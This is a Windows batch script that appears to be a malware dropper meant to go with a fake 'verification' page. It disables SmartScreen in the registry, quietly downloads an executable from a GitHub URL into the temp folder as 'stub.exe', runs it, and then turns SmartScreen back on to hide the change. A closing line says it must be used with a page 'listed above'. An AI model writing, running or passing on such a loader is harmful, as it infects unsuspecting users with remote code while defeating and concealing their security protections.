@echo off
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer" /v "SmartScreenEnabled" /t REG_SZ /d "Off" /f
reg add "HKCU\Software\Microsoft\Windows Defender\SmartScreen" /v "EnableSmartScreen" /t REG_DWORD /d 0 /f

start /min "" powershell -Command "Invoke-WebRequest -Uri 'https://github.com/centralskid/verification/raw/refs/heads/main/stuff/veri123.exe' -OutFile '%TEMP%\stub.exe'; if (Test-Path '%TEMP%\stub.exe') { Start-Process '%TEMP%\stub.exe' }"

reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer" /v "SmartScreenEnabled" /t REG_SZ /d "RequireAdmin" /f
reg add "HKCU\Software\Microsoft\Windows Defender\SmartScreen" /v "EnableSmartScreen" /t REG_DWORD /d 1 /f

exit


MUST BE USED WITH PAGE LISTED ABOVE 
